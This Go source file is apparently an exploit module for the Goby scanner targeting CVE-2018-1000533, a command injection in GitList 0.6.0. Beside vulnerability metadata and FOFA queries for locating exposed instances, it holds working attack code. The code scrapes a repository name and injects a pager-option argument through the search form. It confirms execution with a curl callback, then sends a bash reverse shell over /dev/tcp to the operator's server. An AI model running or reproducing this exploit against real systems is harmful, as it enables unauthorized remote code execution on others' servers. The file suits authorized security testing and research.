package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"log"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "GitList 0.6.0 RCE (CVE-2018-1000533)",
    "Description": "klaussilveira GitList version ",
    "Impact": "GitList 0.6.0 RCE (CVE-2018-1000533)",
    "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322\">https:/ /github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322</a></p>",
    "Product": "GitList",
    "VulType": [
        "Code Execution"
    ],
    "Tags": [
        "Code Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "GitList 0.6.0 search 文件 query 参数远程代码执行漏洞（CVE-2018-1000533）",
            "Description": "<p>klaussilveira GitList是一个使用PHP语言编写的具有图形化界面的Git存储库查看器，它支持与多个Git存储库进行交互、支持使用浏览器查看存储库。</p><p>GitList 0.6及之前版本中的‘searchTree’函数存在安全漏洞。攻击者可利用该漏洞以PHP用户身份执行任意代码。</p>",
            "Impact": "<p>GitList 0.6及之前版本中的‘searchTree’函数存在安全漏洞。攻击者可利用该漏洞以PHP用户身份执行任意代码。<br></p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322\" target=\"_blank\">https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322</a><br></p>",
            "Product": "GitList",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "GitList 0.6.0 RCE (CVE-2018-1000533)",
            "Description": "klaussilveira GitList version <= 0.6 contains a Passing incorrectly sanitized input to system function vulnerability in searchTree function that can result in Execute any code as PHP user. This attack appear to be exploitable via Send POST request using search form. This vulnerability appears to have been fixed in 0.7 after commit 87b8c26b023c3fc37f0796b14bb13710f397b322.",
            "Impact": "GitList 0.6.0 RCE (CVE-2018-1000533)",
            "Recommendation": "<p>The vendor has released a bug fix, please keep an eye on the update: <a href=\"https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322\" target=\"_blank\">https:/ /github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322</a><br></p>",
            "Product": "GitList",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "FofaQuery": "title=\"GitList\" || (body=\"/gitlist/\")",
    "GobyQuery": "title=\"GitList\" || (body=\"/gitlist/\")",
    "Author": "ovi3",
    "Homepage": "https://gitlist.org/",
    "DisclosureDate": "2018-06-26",
    "References": [
        "https://github.com/klaussilveira/gitlist/commit/87b8c26b023c3fc37f0796b14bb13710f397b322",
        "https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html",
        "https://nvd.nist.gov/vuln/detail/CVE-2018-1000533",
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000533"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.8",
    "CVEIDs": [
        "CVE-2018-1000533"
    ],
    "CNVD": [],
    "CNNVD": [
        "CNNVD-201806-1265"
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "AttackType",
            "type": "select",
            "value": "goby_shell_linux",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [
            "GitList"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	execCmd := func(u *httpclient.FixUrl, cmd string) bool {
		resp, err := httpclient.SimpleGet(u.FixedHostInfo)
		if err != nil {
			return false
		}
		m := regexp.MustCompile(`icon-spaced"></i> <a href="/(.*?)/">`).FindStringSubmatch(resp.RawBody)
		if len(m) == 0 {
			return false
		}
		repoName := m[1]
		fmt.Println("found a repo: " + repoName)
		cfg := httpclient.NewPostRequestConfig("/" + repoName + "/tree/a/search")
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		cfg.VerifyTls = false
		cfg.FollowRedirect = true
		cfg.Data = "query=-" + url.QueryEscape("-open-files-in-pager="+cmd)
		_, err = httpclient.DoHttpRequest(u, cfg)
		if err != nil {
			return false
		}
		return true
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(4)
			checkUrl, _ := godclient.GetGodCheckURL(checkStr)
			res := execCmd(u, "curl "+checkUrl+";")
			if !res {
				return false
			}
			return godclient.PullExists(checkStr, time.Second*15)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["AttackType"].(string) == "goby_shell_linux" {
				waitSessionCh := make(chan string)
				if rp, err := godclient.WaitSession("reverse_linux", waitSessionCh); err != nil || len(rp) == 0 {
					log.Println("[WARNING] godclient bind failed", err)
				} else {
					cmd := fmt.Sprintf(`bash -c "bash -i >& /dev/tcp/%s/%s 0>&1 &"`, godclient.GetGodServerHost(), rp)
					res := execCmd(expResult.HostInfo, cmd)
					if !res {
						return expResult
					}
					select {
					case webConsleID := <-waitSessionCh:
						log.Println("[DEBUG] session created at:", webConsleID)
						if u, err := url.Parse(webConsleID); err == nil {
							expResult.Success = true
							expResult.OutputType = "html"
							sid := strings.Join(u.Query()["id"], "")
							expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						}
					case <-time.After(time.Second * 15):
					}
				}
			}
			return expResult
		},
	))
}
